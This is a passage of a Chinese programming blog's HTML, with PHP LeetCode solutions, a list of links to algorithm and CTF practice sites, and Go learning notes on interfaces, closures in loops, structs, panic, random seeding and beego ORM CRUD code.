class="number">10</span>);</span><br><span class="line">            $x = (int)($x / <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $x === $reverse || $x === (int)($reverse / <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Remove-Linked-List-Elements"><a href="#Remove-Linked-List-Elements" class="headerlink" title="Remove Linked List Elements"></a>Remove Linked List Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param ListNode $head</span></span><br><span class="line"><span class="comment">     * @param Integer $val</span></span><br><span class="line"><span class="comment">     * @return ListNode</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeElements</span>(<span class="params">$head, $val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!$head)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data=$head;</span><br><span class="line">        <span class="keyword">while</span>($data-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>($data-&gt;next-&gt;val==$val)&#123;</span><br><span class="line">                $data-&gt;next=$data-&gt;next-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $data=$data-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $head-&gt;val==$val?$head-&gt;next:$head;      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://lbjheiheihei.xyz/2018/08/23/CTF-2.html" target="_blank" rel="noopener">CTF 相关的内容</a></p>
<p><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">ctf 挑战</a></p>
<p><a href="http://cs-cjl.com/2016/06_23_leetcode_1_two_sum" target="_blank" rel="noopener">LeetCode 算法题 1. Two Sum</a></p>
<p><a href="https://laravelacademy.org/post/19641.html" target="_blank" rel="noopener">Leetcode基础刷题之PHP解析(112. Path Sum)</a></p>
<p><a href="https://learnku.com/articles/25478" target="_blank" rel="noopener">尝试 Leetcode https://github.com/icecho/leetcode</a></p>
<p><a href="https://laravelacademy.org/tags/leetcode" target="_blank" rel="noopener">Leetcode之PHP版题目解析</a></p>
<p><a href="https://leetcode-cn.com/" target="_blank" rel="noopener">leetcode中国</a></p>
<p><a href="https://github.com/haoel/haoel.github.io" target="_blank" rel="noopener">科学上网</a></p>
<p><a href="https://learnku.com/articles/25461#topnav" target="_blank" rel="noopener">挑战用 PHP 在 LeetCode 刷算法题</a></p>
<p><a href="http://blessjing.cn/index.php/2019/03/31/arts-%E6%8C%91%E6%88%98%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%89/" target="_blank" rel="noopener">ARTS 挑战</a></p>
<p><a href="https://github.com/haoel/leetcode" target="_blank" rel="noopener">LEETCODE 编程训练</a></p>
<p><a href="https://github.com/wuqinqiang/leetcode-php" target="_blank" rel="noopener">PHP 开始 leetcode 刷题时光</a></p>
<p><a href="https://learnku.com/articles/29219" target="_blank" rel="noopener">Leetcode 二叉树题目集合</a></p>
<p><a href="https://github.com/8090Lambert/Leetcode-Example" target="_blank" rel="noopener">Leetcode 全套题解</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/18/golang-学习笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/18/golang-学习笔记/" itemprop="url">golang 学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-18T20:39:59+08:00">
                2019-03-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  7.9k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  38 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="interface-接口"><a href="#interface-接口" class="headerlink" title="interface 接口"></a>interface 接口</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/25488</span></span><br><span class="line">type Pet interface &#123;</span><br><span class="line">    SetName(name string)</span><br><span class="line">    Name() string</span><br><span class="line">    Category() string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Dog struct &#123;</span><br><span class="line">    name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (dog *Dog) SetName(name string) &#123;</span><br><span class="line">    dog.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (dog Dog) Name() string &#123;</span><br><span class="line">    <span class="keyword">return</span> dog.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (dog Dog) Category() string &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"dog"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func TestDog(t *testing.T) &#123;</span><br><span class="line">    dog := Dog&#123;<span class="string">"little pig"</span>&#125;</span><br><span class="line">    _, <span class="attr">ok</span> := interface&#123;&#125;(dog).(Pet)</span><br><span class="line">    fmt.Printf(<span class="string">"Dog implements interface Pet: %v\n"</span>, ok) <span class="comment">// Dog implements interface Pet: false</span></span><br><span class="line">    _, ok = interface&#123;&#125;(&amp;dog).(Pet)</span><br><span class="line">    fmt.Printf(<span class="string">"*Dog implements interface Pet: %v\n"</span>, ok) <span class="comment">// *Dog implements interface Pet: true</span></span><br><span class="line">    <span class="keyword">var</span> pet Pet = &amp;dog</span><br><span class="line">    fmt.Printf(<span class="string">"This pet is a %s, the name is %q.\n"</span>,</span><br><span class="line">        pet.Category(), pet.Name()) <span class="comment">//  This pet is a dog, the name is "little pig".</span></span><br><span class="line"></span><br><span class="line">    dog.SetName(<span class="string">"monster"</span>)</span><br><span class="line">    fmt.Printf(<span class="string">"This pet is a %s, the name is %q.\n"</span>,</span><br><span class="line">        pet.Category(), pet.Name()) <span class="comment">// This pet is a dog, the name is "monster".</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Go-陷阱之-for-循环迭代变量"><a href="#Go-陷阱之-for-循环迭代变量" class="headerlink" title="Go 陷阱之 for 循环迭代变量"></a>Go 陷阱之 for 循环迭代变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"><span class="comment">//https://learnku.com/articles/26861</span></span><br><span class="line">func main() &#123;</span><br><span class="line">    sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">        fmt.Println(&amp;v)</span><br><span class="line">        slice = append(slice, func()&#123;</span><br><span class="line">            fmt.Println(v * v) <span class="comment">// 直接打印结果</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">        val()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 25 25 25 25 25</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">        temp := v <span class="comment">// 其实很简单 引入一个临时局部变量就可以了，这样就可以将每次的值存储到该变量地址上</span></span><br><span class="line">        fmt.Println(&amp;temp) <span class="comment">// 这里内存地址是不同的</span></span><br><span class="line">        slice = append(slice, func()&#123;</span><br><span class="line">            fmt.Println(temp *  temp) <span class="comment">// 直接打印结果</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">        val()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 1, 4, 9, 16, 25 预期结果</span></span><br><span class="line"><span class="keyword">for</span> i, <span class="attr">v</span> := range</span><br><span class="line">i, v 都是只创建一次，然后循环中赋值。</span><br><span class="line">另外，循环的数组或 <span class="built_in">Map</span>，是在开始前的镜像，循环中添加或移除元素不改变其循环次数。</span><br><span class="line">关于循环还可以引申的是 <span class="built_in">Map</span> 时是无序的</span><br></pre></td></tr></table></figure>
<h3 id="Struct-与-面向对象"><a href="#Struct-与-面向对象" class="headerlink" title="Struct 与 面向对象"></a>Struct 与 面向对象</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">type Human struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> tom Human</span><br><span class="line"><span class="comment">// 通过赋值初始化 https://learnku.com/articles/25094</span></span><br><span class="line">tom.name, tom.age = <span class="string">"Tom"</span>, <span class="number">18</span></span><br><span class="line"><span class="comment">// 详细初始化</span></span><br><span class="line">jerry := Human&#123;<span class="attr">age</span>:<span class="number">25</span>, <span class="attr">name</span>:<span class="string">"Jerry"</span>&#125;</span><br><span class="line"><span class="comment">// 按照结构体声明顺序</span></span><br><span class="line">peter := Human&#123;<span class="string">"Peter"</span>, <span class="number">34</span>&#125;</span><br><span class="line"><span class="comment">// 通过 . 访问</span></span><br><span class="line">fmt.Printf(<span class="string">"%s is %d old\n"</span>, tom.name, tom.age)</span><br><span class="line"></span><br><span class="line">type Staff struct &#123;</span><br><span class="line">    Human <span class="comment">// 隐式的引入 Human 的字段</span></span><br><span class="line">    wage int</span><br><span class="line">    age float32 <span class="comment">// 覆盖 Human 的 age</span></span><br><span class="line">&#125;</span><br><span class="line">tom := Staff&#123;Human&#123;<span class="string">"Tom"</span>, <span class="number">18</span>&#125;, <span class="number">1000</span>, <span class="number">18.5</span>&#125;</span><br><span class="line">jerr := Staff&#123;<span class="attr">Human</span>:Human&#123;<span class="attr">age</span>:<span class="number">32</span>, <span class="attr">name</span>:<span class="string">"Jerr"</span>&#125;, <span class="attr">wage</span>: <span class="number">2000</span>, <span class="attr">age</span>: <span class="number">32.5</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">"%s is %f old，%d years, wage is %d"</span>, tom.name, tom.Human.age, tom.age, tom.wage)</span><br><span class="line">fmt.Printf(<span class="string">"%s is %f old，%d years, wage is %d"</span>, jerr.name, jerr.Human.age, jerr.age, jerr.wage)</span><br><span class="line">type Human struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Employee struct &#123;</span><br><span class="line">    Human</span><br><span class="line">    wage int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (h *Human) Say() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Hi, I am %s, My age is %d"</span>, h.name, h.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employee 重写 Say</span></span><br><span class="line">func (e *Employee) Say() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Hi, I am %s, %d old year, wage is %d per mothn"</span>, e.name, e.age, e.wage)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func TestPanic(t *testing.T) &#123;</span><br><span class="line">    defer func() &#123;</span><br><span class="line">        fmt.Println(<span class="string">"最后结果依旧执行!"</span>) <span class="comment">// 这一部分的代码依旧执行</span></span><br><span class="line">    &#125;()</span><br><span class="line">    fmt.Println(<span class="string">"执行开始"</span>)</span><br><span class="line">    panic(errors.New(<span class="string">"错误信息!"</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出大致结果如下</span></span><br><span class="line">开始</span><br><span class="line">最后结果依旧执行!</span><br><span class="line">--- FAIL: TestPanic (<span class="number">0.00</span>s)</span><br><span class="line">panic: 错误信息! [recovered]</span><br><span class="line">panic: 错误信息!</span><br></pre></td></tr></table></figure>
<h3 id="rand-Intn-生成的是伪随机数"><a href="#rand-Intn-生成的是伪随机数" class="headerlink" title="rand.Intn () 生成的是伪随机数"></a>rand.Intn () 生成的是伪随机数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rand.Intn() 函数是个伪随机函数, 不管运行多少次都只会返回同样的随机数, 因为它默认的资源就是单一值, 所以必须调用 rand.Seed(), 并且传入一个变化的值作为参数, 如 time.Now().UnixNano() , 就是可以生成时刻变化的值.</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (<span class="string">"fmt"</span></span><br><span class="line">        <span class="string">"math/rand"</span></span><br><span class="line">        <span class="string">"time"</span>)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="comment">// 初始化随机数的资源库, 如果不执行这行, 不管运行多少次都返回同样的值https://learnku.com/articles/26011</span></span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    fmt.Println(<span class="string">"A number from 1-100"</span>, rand.Intn(<span class="number">81</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="beego-框架-model-curd"><a href="#beego-框架-model-curd" class="headerlink" title="beego 框架 model curd"></a>beego 框架 model curd</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">定义要连接的数据库 main.go https:<span class="comment">//learnku.com/articles/26029#topnav</span></span><br><span class="line"></span><br><span class="line">package  main</span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  _  <span class="string">"newgo/routers"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego/orm"</span></span><br><span class="line">  _  <span class="string">"github.com/go-sql-driver/mysql"</span></span><br><span class="line">)</span><br><span class="line">func  init()  &#123;</span><br><span class="line">  orm.RegisterDriver(<span class="string">"mysql"</span>,  orm.DRMySQL)</span><br><span class="line">  orm.RegisterDataBase(<span class="string">"default"</span>,  <span class="string">"mysql"</span>,  <span class="string">"root:root@tcp(127.0.0.1:3306)/go?charset=utf8"</span>)</span><br><span class="line">&#125;</span><br><span class="line">func  main()  &#123;</span><br><span class="line">  beego.Run()</span><br><span class="line">&#125;</span><br><span class="line">定义路由 router.go</span><br><span class="line"></span><br><span class="line">beego.Router(<span class="string">"/type"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"GET:Type"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifyinsert"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"POST:ClassifyInsert"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifyupdate"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"GET:ClassifyUpdate"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifysave"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"POST:ClassifySave"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifydel"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"GET:ClassifyDel"</span>)</span><br><span class="line">model书写</span><br><span class="line"></span><br><span class="line">package  models</span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  <span class="string">"github.com/astaxie/beego/orm"</span></span><br><span class="line">)</span><br><span class="line">type  Classify  struct  &#123;</span><br><span class="line">  Id  int</span><br><span class="line">  Name  string</span><br><span class="line">  Content  string</span><br><span class="line">&#125;</span><br><span class="line">func  init()  &#123;</span><br><span class="line">  orm.RegisterModel(<span class="keyword">new</span>(Classify))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//增加操作</span></span><br><span class="line">func  InsertClassify(name  string,  content  string)  (int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  clasinfo  Classify</span><br><span class="line">  clasinfo.Name  =  name</span><br><span class="line">  clasinfo.Content  =  content</span><br><span class="line">  id,  <span class="attr">err</span>  :=  o.Insert(&amp;clasinfo)</span><br><span class="line">  <span class="keyword">return</span>  id,  err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除操作</span></span><br><span class="line">func  ClassifyDel(id  int)  ([]Classify,  int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  lists  []Classify</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.QueryTable(<span class="string">"classify"</span>).Filter(<span class="string">"Id"</span>,  id).Delete()</span><br><span class="line">  o.QueryTable(<span class="string">"inventory"</span>).Filter(<span class="string">"Cid"</span>,  id).Delete()</span><br><span class="line">  <span class="keyword">return</span>  lists,  num,  err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//展示</span></span><br><span class="line">func  ClassifyList()  ([]Classify,  int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  lists  []Classify</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.QueryTable(<span class="string">"classify"</span>).All(&amp;lists)</span><br><span class="line">  <span class="keyword">return</span>  lists,  num,  err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">func  ClassifyUpdate(id  int,  name  string,  content  string)  ([]Classify,  int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  lists  []Classify</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.QueryTable(<span class="string">"classify"</span>).Filter(<span class="string">"Id"</span>,  id).Update(orm.Params&#123;</span><br><span class="line">  <span class="string">"name"</span>:  name,</span><br><span class="line">  <span class="string">"content"</span>:  content,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span>  lists,  num,  err</span><br><span class="line">&#125;</span><br><span class="line">控制器</span><br><span class="line"></span><br><span class="line">package  controllers</span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">  <span class="string">"newgo/models"</span></span><br><span class="line">  <span class="string">"strings"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego/orm"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego"</span></span><br><span class="line">)</span><br><span class="line">type  ClassifyController  struct  &#123;</span><br><span class="line">  beego.Controller</span><br><span class="line">&#125;</span><br><span class="line">func  (c  *ClassifyController)  Get()  &#123;</span><br><span class="line">  c.TplName  =  <span class="string">"index.html"</span></span><br><span class="line">&#125;</span><br><span class="line">func  (c  *ClassifyController)  Type()  &#123;</span><br><span class="line">  list,  num,  <span class="attr">err</span>  :=  models.ClassifyList()</span><br><span class="line">  <span class="keyword">if</span>  err  ==  nil  &#123;</span><br><span class="line">  fmt.Println(list)</span><br><span class="line">  fmt.Println(num)</span><br><span class="line">  &#125;</span><br><span class="line">  c.Data[<span class="string">"comment"</span>]  =  list</span><br><span class="line">  fmt.Println(list)</span><br><span class="line">  c.TplName  =  <span class="string">"type.html"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加post</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifyInsert()  &#123;</span><br><span class="line">  content  :=  strings.TrimSpace(c.GetString(<span class="string">"content"</span>))</span><br><span class="line">  name  :=  strings.TrimSpace(c.GetString(<span class="string">"name"</span>))</span><br><span class="line">  models.InsertClassify(name,  content)</span><br><span class="line">  c.Ctx.Redirect(<span class="number">302</span>,  <span class="string">"/type"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改get展示</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifySave()  &#123;</span><br><span class="line">  id,  <span class="attr">_</span>  :=  c.GetInt(<span class="string">"id"</span>)</span><br><span class="line">  fmt.Println(id)</span><br><span class="line">  content  :=  strings.TrimSpace(c.GetString(<span class="string">"content"</span>))</span><br><span class="line">  name  :=  strings.TrimSpace(c.GetString(<span class="string">"name"</span>))</span><br><span class="line">  models.ClassifyUpdate(id,  name,  content)</span><br><span class="line">  c.Ctx.Redirect(<span class="number">302</span>,  <span class="string">"/type"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifyDel()  &#123;</span><br><span class="line">  id,  <span class="attr">_</span>  :=  c.GetInt(<span class="string">"id"</span>)</span><br><span class="line">  models.ClassifyDel(id)</span><br><span class="line">  c.Ctx.WriteString(<span class="string">"200"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改post方法</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifyUpdate()  &#123;</span><br><span class="line">  id,  <span class="attr">_</span>  :=  c.GetInt(<span class="string">"id"</span>)</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  type  Comment  struct  &#123;</span><br><span class="line">  Id  int</span><br><span class="line">  Name  string</span><br><span class="line">  Content  string</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span>  comments  []Comment</span><br><span class="line">  <span class="keyword">var</span>  com  []Comment</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.Raw(<span class="string">"select  *  from  classify  where  id=?"</span>,  id).QueryRows(&amp;comments)</span><br><span class="line">  